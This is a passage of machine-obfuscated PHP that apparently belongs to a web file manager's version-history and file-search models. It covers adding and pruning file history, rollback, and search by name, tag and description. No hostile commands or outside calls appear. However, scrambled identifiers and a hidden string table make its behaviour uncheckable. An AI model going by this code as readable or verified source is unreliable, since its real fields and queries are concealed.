foreach ($γ£‘““ as $λΦ›θε•) { $ΝΕ«–¥Ό = $λΦ›θε•[$¤Νέέ[529]]; if ($λΦ›θε•[$¤Νέέ[33]] == $¤Νέέ[628] && isset($ΝΕ«–¥Ό[$¤Νέέ[1250]])) { $‹ρΝΙζΆ[] = $ΝΕ«–¥Ό[$¤Νέέ[1250]] . $¤Νέέ[12]; $‹ρΝΙζΆ[] = $ΝΕ«–¥Ό[$¤Νέέ[1251]] . $¤Νέέ[12]; } if ($λΦ›θε•[$¤Νέέ[33]] == $¤Νέέ[2239] && isset($ΝΕ«–¥Ό[$¤Νέέ[194]])) { $‹ρΝΙζΆ[] = $ΝΕ«–¥Ό[$¤Νέέ[194]] . $¤Νέέ[12]; } } $‹ρΝΙζΆ = array_merge($‹ρΝΙζΆ, $Μλ®ρψέ, array($λΛ―λΰΣ . $¤Νέέ[12])); $‹ρΝΙζΆ = array_unique($‹ρΝΙζΆ); $ω”δώχς = array_unique(array_to_keyvalue($γ£‘““, $¤Νέέ[12], $¤Νέέ[1793])); $αΨ›έ… = Model($¤Νέέ[602])->userListInfo($ω”δώχς); $νΘΧΨίΏ = Model($¤Νέέ[905])->sourceListInfo($‹ρΝΙζΆ, !0); foreach ($γ£‘““ as &$λΦ›θε•) { if ($λΦ›θε•[$¤Νέέ[33]] == $¤Νέέ[628] && isset($λΦ›θε•[$¤Νέέ[529]][$¤Νέέ[1250]])) { $λΦ›θε•[$¤Νέέ[529]][$¤Νέέ[1250]] = $νΘΧΨίΏ[$λΦ›θε•[$¤Νέέ[529]][$¤Νέέ[1250]]]; $λΦ›θε•[$¤Νέέ[529]][$¤Νέέ[1251]] = $νΘΧΨίΏ[$λΦ›θε•[$¤Νέέ[529]][$¤Νέέ[1251]]]; } if ($λΦ›θε•[$¤Νέέ[33]] == $¤Νέέ[2239] && isset($λΦ›θε•[$¤Νέέ[529]][$¤Νέέ[194]])) { $λΦ›θε•[$¤Νέέ[529]][$¤Νέέ[194]] = $νΘΧΨίΏ[$λΦ›θε•[$¤Νέέ[529]][$¤Νέέ[194]]]; } $λΦ›θε•[$¤Νέέ[90]] = $νΘΧΨίΏ[$λΦ›θε•[$¤Νέέ[194]]]; $λΦ›θε•[$¤Νέέ[2244]] = $νΘΧΨίΏ[$λΦ›θε•[$¤Νέέ[2228]]]; if ($λΦ›θε•[$¤Νέέ[33]] == $¤Νέέ[1962]) { $λΦ›θε•[$¤Νέέ[2244]] = $λΦ›θε•[$¤Νέέ[90]]; $λΦ›θε•[$¤Νέέ[2228]] = $λΦ›θε•[$¤Νέέ[2244]][$¤Νέέ[194]]; $λΦ›θε•[$¤Νέέ[90]] = !1; $λΦ›θε•[$¤Νέέ[194]] = $¤Νέέ[12]; } $λΦ›θε•[$¤Νέέ[2173]] = $αΨ›έ…[$λΦ›θε•[$¤Νέέ[1793]]]; } unset($λΦ›θε•); $β‡ιι[$¤Νέέ[448]] = $γ£‘““; return $β‡ιι; } public function removeBySource($Κ¬μζήΚ) { $§‚‹Ό = array($_SERVER[γγάψ½][494] => $Κ¬μζήΚ); $this->where($§‚‹Ό)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\162\x63\x65\x5f\150\151\163\164\x6f\162\171"; public function historyCount($»Ο»χΝδ) { $ρ’™ =& $_SERVER[γγάψ½]; if (!$»Ο»χΝδ) { return array(); } if (is_string($»Ο»χΝδ) || is_int($»Ο»χΝδ)) { $»Ο»χΝδ = array($»Ο»χΝδ); } $”Πςόƒ = array($ρ’™[194], $ρ’™[2245] => $ρ’™[570]); $ΞΜά―σ = array($ρ’™[194] => array($ρ’™[7], $»Ο»χΝδ)); $µ²ϊΪ³τ = $this->field($”Πςόƒ)->where($ΞΜά―σ)->group($ρ’™[194])->select(); return array_to_keyvalue($µ²ϊΪ³τ, $ρ’™[194], $ρ’™[570]); } public function addHistory($Νς΅ιΝ›, $»΄ί·ΕΈ = '') { $ΡΒ΅Σθ³ =& $_SERVER[γγάψ½]; $–ΝΩΞ½ = array($ΡΒ΅Σθ³[494] => $Νς΅ιΝ›[$ΡΒ΅Σθ³[194]], $ΡΒ΅Σθ³[1784] => isset($Νς΅ιΝ›[$ΡΒ΅Σθ³[532]]) ? $Νς΅ιΝ›[$ΡΒ΅Σθ³[532]] : $Νς΅ιΝ›[$ΡΒ΅Σθ³[530]], $ΡΒ΅Σθ³[547] => $Νς΅ιΝ›[$ΡΒ΅Σθ³[546]], $ΡΒ΅Σθ³[625] => $Νς΅ιΝ›[$ΡΒ΅Σθ³[79]], $ΡΒ΅Σθ³[2246] => $»΄ί·ΕΈ); if ($GLOBALS[$ΡΒ΅Σθ³[6]][$ΡΒ΅Σθ³[92]][$ΡΒ΅Σθ³[1313]] >= 1) { $this->historyAutoClear($–ΝΩΞ½[$ΡΒ΅Σθ³[194]]); $this->add($–ΝΩΞ½); } Hook::trigger($ΡΒ΅Σθ³[2247], $–ΝΩΞ½); Model($ΡΒ΅Σθ³[2248])->eventFileEdit($Νς΅ιΝ›[$ΡΒ΅Σθ³[194]]); } private function historyAutoClear($µλύΉ) { $³ κΖ =& $_SERVER[γγάψ½]; $ΣΛ—­Η’ = Model($³ κΖ[845])->get($³ κΖ[1335]); $›ωος―Ϊ = intval($GLOBALS[$³ κΖ[6]][$³ κΖ[92]][$³ κΖ[1313]]); $ΖΔΩ²τ = $ΣΛ—­Η’ == $³ κΖ[1336] ? min(5, $›ωος―Ϊ) : $›ωος―Ϊ; $ΖΔΩ²τ = $ΖΔΩ²τ <= 0 ? 0 : $ΖΔΩ²τ - 1; if ($ΖΔΩ²τ >= 499) { return; } $ΩχΑΛ›‹ = array($³ κΖ[494] => $µλύΉ); $χ¥έ£ϊ› = $this->field($³ κΖ[2249])->where($ΩχΑΛ›‹)->order($³ κΖ[2242])->select(); if (!$χ¥έ£ϊ› || $ΖΔΩ²τ >= count($χ¥έ£ϊ›)) { return; } $Ρ½κ“γΥ = array_to_keyvalue($χ¥έ£ϊ›, $³ κΖ[12], $³ κΖ[478]); $Ρ½κ“γΥ = array_slice($Ρ½κ“γΥ, $ΖΔΩ²τ); $ΕΪ²κΤ = array_to_keyvalue($χ¥έ£ϊ›, $³ κΖ[12], $³ κΖ[546]); $ΕΪ²κΤ = array_slice($ΕΪ²κΤ, $ΖΔΩ²τ); if (!$Ρ½κ“γΥ || !$ΕΪ²κΤ) { return; } $ΩχΑΛ›‹ = array($³ κΖ[496] => array($³ κΖ[7], $Ρ½κ“γΥ)); $this->where($ΩχΑΛ›‹)->delete(); Model($³ κΖ[549])->remove($ΕΪ²κΤ); } public function listData($ωΏμ―Θ) { $ΖΣ•ώε =& $_SERVER[γγάψ½]; $νΙ΄ξ = array($ΖΣ•ώε[494] => $ωΏμ―Θ); $Ύί­ψμ = $ΖΣ•ώε[2250]; $΄ΗΖΪ”® = $this->field($Ύί­ψμ)->where($νΙ΄ξ)->order($ΖΣ•ώε[2242])->selectPage(); $this->_listAppendUser($΄ΗΖΪ”®[$ΖΣ•ώε[448]]); $«χ™ξξ = Model($ΖΣ•ώε[845])->get($ΖΣ•ώε[1335]); $άψ– = 5; if ($«χ™ξξ == $ΖΣ•ώε[1336]) { $΄ΗΖΪ”®[$ΖΣ•ώε[448]] = array_slice($΄ΗΖΪ”®[$ΖΣ•ώε[448]], 0, $άψ–); $΄ΗΖΪ”®[$ΖΣ•ώε[445]] = array($ΖΣ•ώε[2251] => 1, $ΖΣ•ώε[2252] => 20, $ΖΣ•ώε[2253] => 1, $ΖΣ•ώε[2254] => count($΄ΗΖΪ”®[$ΖΣ•ώε[448]])); } return $΄ΗΖΪ”®; } protected function _listAppendUser(&$Λ§β©‰Ρ) { $‰ω©όκ– =& $_SERVER[γγάψ½]; $±³²°’ = array_to_keyvalue($Λ§β©‰Ρ, $‰ω©όκ–[12], $‰ω©όκ–[1793]); $ψύ£­‡‹ = Model($‰ω©όκ–[602])->userListInfo($±³²°’); foreach ($Λ§β©‰Ρ as &$πι†΄¤Ω) { $υΑ§¬― = $πι†΄¤Ω[$‰ω©όκ–[1793]]; $πι†΄¤Ω[$‰ω©όκ–[530]] = $ψύ£­‡‹[$υΑ§¬―] ? $ψύ£­‡‹[$υΑ§¬―] : !1; } unset($πι†΄¤Ω); } public function fileInfo($ϊΡΧάΠ±, $²”ΐΑΘ = false) { $†ξ―­ώι =& $_SERVER[γγάψ½]; $¬¤¬ξ = $this->tablePrefix; $ϊ­΄—ΣΥ = "{$¬¤¬ξ}\151\157\x5f\x66\151\154\145\x20\x66\151\154\x65\163\x20\x6f\x6e\40\146\151\154\x65\163\56\146\x69\x6c\x65\x49\x44\x20\75\x20\x68\151\163\x74\157\x72\x79\x2e\146\151\154\x65\111\104"; $Η±Λ©΄ = $this->alias($†ξ―­ώι[2255])->where(array($†ξ―­ώι[496] => $ϊΡΧάΠ±))->join($ϊ­΄—ΣΥ, $†ξ―­ώι[2256])->find(); if ($Η±Λ©΄ && $²”ΐΑΘ) { $Άβφ΄Υ = array($†ξ―­ώι[194] => $Η±Λ©΄[$†ξ―­ώι[194]], $†ξ―­ώι[478] => array($†ξ―­ώι[1099], $ϊΡΧάΠ±)); $Η±Λ©΄[$†ξ―­ώι[1678]] = $this->where($Άβφ΄Υ)->count(); } return $Η±Λ©΄; } public function removeItem($χΎρ΅θΨ) { $παƒχΈψ =& $_SERVER[γγάψ½]; $Ύƒζ³ΐ = array($παƒχΈψ[496] => $χΎρ΅θΨ); $Ζ²’ωΑ = $this->where($Ύƒζ³ΐ)->find(); if ($Ζ²’ωΑ) { $ιά®φ¬¶ = $this->where($Ύƒζ³ΐ)->delete(); Model($παƒχΈψ[549])->remove($Ζ²’ωΑ[$παƒχΈψ[546]]); return $ιά®φ¬¶; } return !1; } public function removeBySource($΅Φ»΄α€) { $ΓΛ¤“ΪΎ =& $_SERVER[γγάψ½]; if (!$΅Φ»΄α€) { return !1; } if (!is_array($΅Φ»΄α€)) { $΅Φ»΄α€ = array($΅Φ»΄α€); } $©ψ–ΥΓ” = array($ΓΛ¤“ΪΎ[494] => array($ΓΛ¤“ΪΎ[7], $΅Φ»΄α€)); $‡Μ°Χφ„ = $this->field($ΓΛ¤“ΪΎ[547])->where($©ψ–ΥΓ”)->select(); if ($‡Μ°Χφ„) { $this->where($©ψ–ΥΓ”)->delete(); $±¨£άΐΫ = array_to_keyvalue($‡Μ°Χφ„, $ΓΛ¤“ΪΎ[12], $ΓΛ¤“ΪΎ[546]); Model($ΓΛ¤“ΪΎ[549])->remove($±¨£άΐΫ); } return !0; } public function setDetail($„Εκρά³, $ω‡θ»θ€) { $ΧψΫ©γΉ =& $_SERVER[γγάψ½]; return $this->where(array($ΧψΫ©γΉ[496] => $„Εκρά³))->save(array($ΧψΫ©γΉ[2246] => $ω‡θ»θ€)); } public function rollbackToItem($ΫΠόƒΩζ, $Γτ®”ΣΥ) { $½ΪΆΟ’ =& $_SERVER[γγάψ½]; $‚™τΦµ = Model($½ΪΆΟ’[905])->sourceInfo($ΫΠόƒΩζ); $this->addHistory($‚™τΦµ, LNG($½ΪΆΟ’[2257])); $›ω¨Ά€ό = $this->find($Γτ®”ΣΥ); $€™”£€ = array($½ΪΆΟ’[546] => $›ω¨Ά€ό[$½ΪΆΟ’[546]], $½ΪΆΟ’[79] => $›ω¨Ά€ό[$½ΪΆΟ’[79]], $½ΪΆΟ’[88] => time(), $½ΪΆΟ’[532] => USER_ID); Model($½ΪΆΟ’[905])->where(array($½ΪΆΟ’[194] => $ΫΠόƒΩζ))->save($€™”£€); return $this->where(array($½ΪΆΟ’[496] => $Γτ®”ΣΥ))->delete(); } public function clearSame($Ά§ΥΆ) { $Ο£ψ²Χε =& $_SERVER[γγάψ½]; $Φέ•Β = $this->listData($Ά§ΥΆ); $ΚΉύƒΤ = array_to_keyvalue_group($Φέ•Β, $Ο£ψ²Χε[546]); $ΒΐΔΣ©‘ = array(); $ΑΦγΉΝ = array(); foreach ($ΚΉύƒΤ as $ξΊόΗ«) { if (!$ξΊόΗ« || count($ξΊόΗ«) <= 1) { continue; } foreach ($ξΊόΗ« as $«ΒΓψ§) { $ΒΐΔΣ©‘[] = $«ΒΓψ§[$Ο£ψ²Χε[546]]; $ΑΦγΉΝ[] = $«ΒΓψ§[$Ο£ψ²Χε[478]]; } } if (!$ΑΦγΉΝ) { return; } $this->where(array($Ο£ψ²Χε[478] => array($Ο£ψ²Χε[7], $ΑΦγΉΝ)))->delete(); Model($Ο£ψ²Χε[549])->remove($ΒΐΔΣ©‘); } public function userSpace() { $μ”£ε ’ =& $_SERVER[γγάψ½]; $Ι¶©ϋΉ΅ = $this->tablePrefix; $“ιΫΏ» = array($μ”£ε ’[1784] => USER_ID); $Ε²β¨‰ = "{$Ι¶©ϋΉ΅}\151\157\137\146\x69\154\x65\40\146\151\154\x65\x73\40\157\x6e\40\146\151\154\x65\x73\x2e\146\151\154\145\x49\104\x20\x3d\40\150\x69\x73\164\x6f\x72\171\56\x66\151\x6c\x65\x49\x44"; return $this->alias($μ”£ε ’[2255])->where($“ιΫΏ»)->join($Ε²β¨‰, $μ”£ε ’[2256])->sum($μ”£ε ’[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ώξΕΖΈ‡) { $€π’€Ψζ =& $_SERVER[γγάψ½]; $νβ­·ά = KodIO::fileTypeList(); $ΗώΩαΆ = $νβ­·ά[$ώξΕΖΈ‡]; if (!$ΗώΩαΆ) { return array(); } $‚σαΛ‡Ε = $ΗώΩαΆ[$€π’€Ψζ[169]]; $‰¤ΊΗπί = $€π’€Ψζ[7]; if (!$ΗώΩαΆ[$€π’€Ψζ[169]]) { $Β‰Ε¥ο = array_to_keyvalue($νβ­·ά, $€π’€Ψζ[12], $€π’€Ψζ[169]); $‚σαΛ‡Ε = implode($€π’€Ψζ[50], $Β‰Ε¥ο); $‰¤ΊΗπί = $€π’€Ψζ[2258]; } $ΉΉσ‘® = explode($€π’€Ψζ[50], trim($‚σαΛ‡Ε, $€π’€Ψζ[50])); return array($‰¤ΊΗπί, $ΉΉσ‘®); } public function listPathType($…™ΆΞ‚Φ) { $ψόΗ― φ =& $_SERVER[γγάψ½]; $γέ…ςο = $this->fileTypeWhere($…™ΆΞ‚Φ); if (!$γέ…ςο) { return array(); } $ΐ³γξ– = USER_ID; $Ό©ι«ύμ = Model($ψόΗ― φ[602])->getInfo($ΐ³γξ–); $»†¤Ώόά = array($ψόΗ― φ[656] => SourceModel::TYPE_USER, $ψόΗ― φ[589] => array($ψόΗ― φ[620], $ψόΗ― φ[598] . $Ό©ι«ύμ[$ψόΗ― φ[90]][$ψόΗ― φ[194]] . $ψόΗ― φ[621]), $ψόΗ― φ[657] => $ΐ³γξ–, $ψόΗ― φ[654] => 0, $ψόΗ― φ[655] => $γέ…ςο); return $this->listSource($»†¤Ώόά); } public function listSearch($†ώ―«Β, $ΆΤόψΚα = 300) { $σΟΡ΄Τθ =& $_SERVER[γγάψ½]; if (isset($†ώ―«Β[$σΟΡ΄Τθ[2092]]) && $†ώ―«Β[$σΟΡ΄Τθ[2092]]) { $†ώ―«Β[$σΟΡ΄Τθ[2092]] = str_replace($σΟΡ΄Τθ[463], $σΟΡ΄Τθ[2259], trim($†ώ―«Β[$σΟΡ΄Τθ[2092]])); } $ΦΦƒΏ¤Ϋ = $this->_parseSearchWhere($†ώ―«Β); if (!isset($ΦΦƒΏ¤Ϋ[$σΟΡ΄Τθ[508]])) { $ΦΦƒΏ¤Ϋ[$σΟΡ΄Τθ[508]] = 0; } $²®‚Επ• = $σΟΡ΄Τθ[2260]; $Δβ…•“® = $ΦΦƒΏ¤Ϋ; $έƒ½Ο = $²®‚Επ•; $this->_listSearchBindPinyin($†ώ―«Β, $ΦΦƒΏ¤Ϋ, $²®‚Επ•); $this->alias($σΟΡ΄Τθ[522])->_makeOrder(); $ΦΦƒΏ¤Ϋ = $this->parseWhereLike($ΦΦƒΏ¤Ϋ); $ΛΙ‹ε = $this->distinct(!0)->field($²®‚Επ•)->where($ΦΦƒΏ¤Ϋ)->selectPage($ΆΤόψΚα); if ($GLOBALS[$σΟΡ΄Τθ[6]][$σΟΡ΄Τθ[460]][$σΟΡ΄Τθ[461]] && Input::check($†ώ―«Β[$σΟΡ΄Τθ[2092]], $σΟΡ΄Τθ[663]) && $ΛΙ‹ε[$σΟΡ΄Τθ[445]][$σΟΡ΄Τθ[431]] == 1 && $ΛΙ‹ε[$σΟΡ΄Τθ[445]][$σΟΡ΄Τθ[446]] == 0) { $ΛΙ‹ε = $this->distinct(!0)->field($²®‚Επ•)->where($Δβ…•“®)->limit(1000)->select(); $ΛΙ‹ε = array_page_split($ΛΙ‹ε, !1, $ΆΤόψΚα); } $this->_listSearchFileContent($ΛΙ‹ε, $†ώ―«Β, $έƒ½Ο, $Δβ…•“®); $this->_listSearchDesc($ΛΙ‹ε, $†ώ―«Β, $έƒ½Ο); $this->_listSearchTag($ΛΙ‹ε, $†ώ―«Β, $έƒ½Ο); $this->_listSearchGroupTag($ΛΙ‹ε, $†ώ―«Β, $έƒ½Ο); $this->_listDataApply($ΛΙ‹ε[$σΟΡ΄Τθ[448]]); $this->_listMake($ΛΙ‹ε); return $ΛΙ‹ε; } private function _listSearchFileContent(&$αμέΚΒ‚, $ΌδδνΜΥ, $Ζ’‡Φ΄ψ, $άΐΫεόΤ) { $υΌ½ΟΰΎ =& $_SERVER[γγάψ½]; if (!$ΌδδνΜΥ[$υΌ½ΟΰΎ[2092]] || $αμέΚΒ‚[$υΌ½ΟΰΎ[445]][$υΌ½ΟΰΎ[431]] > 1) { return; } if (!isset($άΐΫεόΤ[$υΌ½ΟΰΎ[32]]) || !is_array($ΌδδνΜΥ[$υΌ½ΟΰΎ[546]])) { return; } $άΐΫεόΤ[$υΌ½ΟΰΎ[546]] = array($υΌ½ΟΰΎ[7], $ΌδδνΜΥ[$υΌ½ΟΰΎ[546]]); unset($άΐΫεόΤ[$υΌ½ΟΰΎ[32]]); unset($ΌδδνΜΥ[$υΌ½ΟΰΎ[546]]); $ς³δ’ = $this->field($Ζ’‡Φ΄ψ)->where($άΐΫεόΤ)->limit($υΌ½ΟΰΎ[2261])->select(); if (!$ς³δ’ || count($ς³δ’) == 0) { return; } $αμέΚΒ‚[$υΌ½ΟΰΎ[448]] = array_merge($ς³δ’, $αμέΚΒ‚[$υΌ½ΟΰΎ[448]]); $αμέΚΒ‚[$υΌ½ΟΰΎ[445]][$υΌ½ΟΰΎ[446]] += count($ς³δ’); } private function _listSearchTag(&$νΜΩβ, $Ϊίχθ, $ΤΫΎδΈ) { $Φκ®ρ†έ =& $_SERVER[γγάψ½]; if (empty($Ϊίχθ[$Φκ®ρ†έ[1952]]) || !in_array($Φκ®ρ†έ[2262], $Ϊίχθ[$Φκ®ρ†έ[1952]])) { return; } if (!$Ϊίχθ[$Φκ®ρ†έ[2092]] || $νΜΩβ[$Φκ®ρ†έ[445]][$Φκ®ρ†έ[431]] > 1) { return; } $ΩΚΊ« = Model($Φκ®ρ†έ[2263])->listData(); $ώ‰››® = array(); $¬Π¤ζ‰ = $Ϊίχθ[$Φκ®ρ†έ[2092]]; foreach ($ΩΚΊ« as $¥κ£σΠ„) { $θ”Φ«κχ = $¥κ£σΠ„[$Φκ®ρ†έ[32]]; $ΐιµ¨·υ = str_replace($Φκ®ρ†έ[53], $Φκ®ρ†έ[12], Pinyin::get($θ”Φ«κχ)); if (stripos($θ”Φ«κχ, $¬Π¤ζ‰) !== !1 || stripos($ΐιµ¨·υ, $¬Π¤ζ‰) !== !1) { $ώ‰››®[] = $¥κ£σΠ„[$Φκ®ρ†έ[478]]; } } if (!$ώ‰››®) { return; } $νΰΥ± = array($Φκ®ρ†έ[503] => array($Φκ®ρ†έ[7], $ώ‰››®), $Φκ®ρ†έ[1793] => USER_ID); $„υεΧ‡ = Model($Φκ®ρ†έ[505])->field($Φκ®ρ†έ[87])->where($νΰΥ±)->select(); $„υεΧ‡ = array_to_keyvalue($„υεΧ‡, $Φκ®ρ†έ[12], $Φκ®ρ†έ[87]); $ψα“­Ε = array_unique($„υεΧ‡); $this->_listSearchMerge($νΜΩβ, $Ϊίχθ, $ΤΫΎδΈ, $ψα“­Ε); } private function _listSearchDesc(&$®Ηδ—Ν, $Ω΄έΌ¬, $·όΞΛΐ) { $δ‰ΏΟ =& $_SERVER[γγάψ½]; if (empty($Ω΄έΌ¬[$δ‰ΏΟ[1952]]) || !in_array($δ‰ΏΟ[529], $Ω΄έΌ¬[$δ‰ΏΟ[1952]])) { return; } if (!$Ω΄έΌ¬[$δ‰ΏΟ[2092]] || $®Ηδ—Ν[$δ‰ΏΟ[445]][$δ‰ΏΟ[431]] > 1) { return; } $ιλ¤ι…ζ = array($δ‰ΏΟ[97] => $δ‰ΏΟ[529], $δ‰ΏΟ[453] => array($δ‰ΏΟ[462], $δ‰ΏΟ[2094] . $Ω΄έΌ¬[$δ‰ΏΟ[2092]] . $δ‰ΏΟ[2094])); $³γΒ‚ = !1; if ($³γΒ‚) { $°ϊΰΫιΛ = $this->listSearchChildren($Ω΄έΌ¬[$δ‰ΏΟ[193]]); $°ϊΰΫιΛ = array_unique($°ϊΰΫιΛ); if (!$°ϊΰΫιΛ) { return; } $ιλ¤ι…ζ[$δ‰ΏΟ[194]] = array($δ‰ΏΟ[7], $°ϊΰΫιΛ); } $μ³φΘΝ½ = Model($δ‰ΏΟ[640])->field($δ‰ΏΟ[194])->where($ιλ¤ι…ζ)->limit(5000)->select(); $‡ΉΧ΄·ΰ = array_to_keyvalue($μ³φΘΝ½, $δ‰ΏΟ[12], $δ‰ΏΟ[194]); $this->_listSearchMerge($®Ηδ—Ν, $Ω΄έΌ¬, $·όΞΛΐ, $‡ΉΧ΄·ΰ); } private function _listSearchGroupTag(&$λ®βΤΑλ, $¬›‚‡΅, $©ϊβ΅‰κ) { $ο„Όύ¥ό =& $_SERVER[γγάψ½]; if (empty($¬›‚‡΅[$ο„Όύ¥ό[1952]]) || !in_array($ο„Όύ¥ό[2262], $¬›‚‡΅[$ο„Όύ¥ό[1952]])) { return; } if (!$¬›‚‡΅[$ο„Όύ¥ό[2092]] || $λ®βΤΑλ[$ο„Όύ¥ό[445]][$ο„Όύ¥ό[431]] > 1 || !$¬›‚‡΅[$ο„Όύ¥ό[193]]) { return; } $Τει = $this->sourceInfo($¬›‚‡΅[$ο„Όύ¥ό[193]]); if (!$Τει || $Τει[$ο„Όύ¥ό[191]] != SourceModel::TYPE_GROUP) { return; } $³έΔΫ‘ = $Τει[$ο„Όύ¥ό[574]]; $²θΧ„¥Ζ = Model($ο„Όύ¥ό[2264])->get($³έΔΫ‘); $Β¶ΎΣΘ = array(); $–’σϊθά = $¬›‚‡΅[$ο„Όύ¥ό[2092]]; foreach ($²θΧ„¥Ζ[$ο„Όύ¥ό[448]] as $Π»Ράέ΅) { $ψ‰ΈΙ = $Π»Ράέ΅[$ο„Όύ¥ό[32]]; $’ΒίΘ = str_replace($ο„Όύ¥ό[53], $ο„Όύ¥ό[12], Pinyin::get($ψ‰ΈΙ)); if (stripos($ψ‰ΈΙ, $–’σϊθά) !== !1 || stripos($’ΒίΘ, $–’σϊθά) !== !1) { $Β¶ΎΣΘ[] = $Π»Ράέ΅[$ο„Όύ¥ό[478]]; } } if (!$Β¶ΎΣΘ) { return; } $†™®‰Ψ΄ = array($ο„Όύ¥ό[503] => array($ο„Όύ¥ό[7], $Β¶ΎΣΘ), $ο„Όύ¥ό[1793] => 0, $ο„Όύ¥ό[33] => $ο„Όύ¥ό[1397] . $³έΔΫ‘); $Εέ¤‰― = Model($ο„Όύ¥ό[505])->field($ο„Όύ¥ό[87])->where($†™®‰Ψ΄)->select(); $Εέ¤‰― = array_to_keyvalue($Εέ¤‰―, $ο„Όύ¥ό[12], $ο„Όύ¥ό[87]); $ήώΑ² = array_unique($Εέ¤‰―); $this->_listSearchMerge($λ®βΤΑλ, $¬›‚‡΅, $©ϊβ΅‰κ, $ήώΑ²); } private function _listSearchMerge(&$ζο , $ώƒξ•―α, $‘¥ΊκΈ›, $ψΚ–Η¥‘) { $ ‚½¬θ =& $_SERVER[γγάψ½]; if (!$ψΚ–Η¥‘) { return; } $β™Ί‹δ = array_to_keyvalue($ζο [$ ‚½¬θ[448]], $ ‚½¬θ[12], $ ‚½¬θ[194]); $Κδ’ = array_diff($ψΚ–Η¥‘, $β™Ί‹δ); if (!$Κδ’) { return; } $ώ½‘ζησ = array($ ‚½¬θ[194] => array($ ‚½¬θ[7], $Κδ’)); $ƒ•–Υ» = $this->field($‘¥ΊκΈ›)->where($ώ½‘ζησ)->select(); if (!$ƒ•–Υ») { return; } $Γε£’Ξ = array(); foreach ($ƒ•–Υ» as $γπΞΔΛγ) { if ($this->_listSearchFilter($γπΞΔΛγ, $ώƒξ•―α)) { $Γε£’Ξ[] = $γπΞΔΛγ; } } $ζο [$ ‚½¬θ[448]] = array_merge($Γε£’Ξ, $ζο [$ ‚½¬θ[448]]); $ζο [$ ‚½¬θ[445]][$ ‚½¬θ[446]] += count($Γε£’Ξ); } private function _listSearchFilter($ΥΖν„Ν, $ρ‹ΐόΗ) { $ήΡΖΌτ– =& $_SERVER[γγάψ½]; $ιΎτ τξ = $ΥΖν„Ν[$ήΡΖΌτ–[488]] == $ήΡΖΌτ–[91]; if (!strstr($ΥΖν„Ν[$ήΡΖΌτ–[589]], $ήΡΖΌτ–[50] . $ρ‹ΐόΗ[$ήΡΖΌτ–[193]] . $ήΡΖΌτ–[50])) { return !1; } if (isset($ρ‹ΐόΗ[$ήΡΖΌτ–[489]]) && $ρ‹ΐόΗ[$ήΡΖΌτ–[489]] != $ήΡΖΌτ–[851]) { if ($ρ‹ΐόΗ[$ήΡΖΌτ–[489]] == $ήΡΖΌτ–[78] && !$ιΎτ τξ) { return !1; } if ($ρ‹ΐόΗ[$ήΡΖΌτ–[489]] != $ήΡΖΌτ–[78] && $ιΎτ τξ) { return !1; } if (!strstr($ΥΖν„Ν[$ήΡΖΌτ–[169]], $ήΡΖΌτ–[50] . $ρ‹ΐόΗ[$ήΡΖΌτ–[489]] . $ήΡΖΌτ–[50])) { return !1; } } if (isset($ρ‹ΐόΗ[$ήΡΖΌτ–[2265]]) && $ρ‹ΐόΗ[$ήΡΖΌτ–[2265]] < $ΥΖν„Ν[$ήΡΖΌτ–[79]]) { return !1; } if (isset($ρ‹ΐόΗ[$ήΡΖΌτ–[2266]]) && $ρ‹ΐόΗ[$ήΡΖΌτ–[2266]] > $ΥΖν„Ν[$ήΡΖΌτ–[79]]) { return !1; } if (isset($ρ‹ΐόΗ[$ήΡΖΌτ–[670]]) && $ρ‹ΐόΗ[$ήΡΖΌτ–[670]] != $ΥΖν„Ν[$ήΡΖΌτ–[532]]) { return !1; } return !0; } public function listSearchChildren($ψήό·κΑ, $Ζ²Η¦ρ = 5000) { $ςΜαΛέώ =& $_SERVER[γγάψ½]; $μ¤ύ› = array(); $ιώ†ςϊ = $this->sourceInfo($ψήό·κΑ); $…ηΪΉ = array($ςΜαΛέώ[589] => array($ςΜαΛέώ[462], $ιώ†ςϊ[$ςΜαΛέώ[589]] . $ιώ†ςϊ[$ςΜαΛέώ[194]] . $ςΜαΛέώ[621])); $Υ‰²ε‹ = $this->field($ςΜαΛέώ[79])->where($…ηΪΉ)->limit($Ζ²Η¦ρ + 1)->select(); $‘ΔΩΟ£ = is_array($Υ‰²ε‹) ? count($Υ‰²ε‹) : 0; if ($‘ΔΩΟ£ > $Ζ²Η¦ρ) { return $this->_listSearchChildrenNear($ψήό·κΑ, $Ζ²Η¦ρ); } $ήώω•‰Ρ = $this->field($ςΜαΛέώ[194])->where($…ηΪΉ)->select(); $μ¤ύ› = array_to_keyvalue($ήώω•‰Ρ, $ςΜαΛέώ[12], $ςΜαΛέώ[194]); return $μ¤ύ›; } private function _listSearchChildrenNear($ΕτρΫΠγ, $½»¬ΘΗ) { $ώ²ΐƒί— =& $_SERVER[γγάψ½]; $όΧ’ΔΩΙ = array(); $°‘Ϊ’άή = array($ώ²ΐƒί—[193] => $ΕτρΫΠγ); $ν£Χεή = $this->field($ώ²ΐƒί—[2267])->where($°‘Ϊ’άή)->select(); $¬®·ΈΓ” = array_to_keyvalue(array_filter_by_field($ν£Χεή, $ώ²ΐƒί—[488], $ώ²ΐƒί—[91]), $ώ²ΐƒί—[12], $ώ²ΐƒί—[194]); $όΧ’ΔΩΙ = array_merge($όΧ’ΔΩΙ, array_to_keyvalue($ν£Χεή, $ώ²ΐƒί—[12], $ώ²ΐƒί—[194])); if (!$¬®·ΈΓ”) { return $όΧ’ΔΩΙ; } $°‘Ϊ’άή = array($ώ²ΐƒί—[193] => array($ώ²ΐƒί—[7], $¬®·ΈΓ”)); $ν£Χεή = $this->field($ώ²ΐƒί—[2267])->where($°‘Ϊ’άή)->limit($½»¬ΘΗ)->select(); $όΧ’ΔΩΙ = array_merge($όΧ’ΔΩΙ, array_to_keyvalue($ν£Χεή, $ώ²ΐƒί—[12], $ώ²ΐƒί—[194])); $όΧ’ΔΩΙ = array_slice($όΧ’ΔΩΙ, 0, intval($½»¬ΘΗ)); return $όΧ’ΔΩΙ; } private function _listSearchBindPinyin($ΘθΪΠΗ, &$·ϊ΅ΫΔΛ, &$ΠΎ®ς„) { $ΔοΩώα =& $_SERVER[γγάψ½]; if (!isset($ΘθΪΠΗ[$ΔοΩώα[2092]]) || !$ΘθΪΠΗ[$ΔοΩώα[2092]]) { return; } if (!Input::check($ΘθΪΠΗ[$ΔοΩώα[2092]], $ΔοΩώα[396]) || strlen($ΘθΪΠΗ[$ΔοΩώα[2092]]) < 2) { return; } $”Ύ²μ = 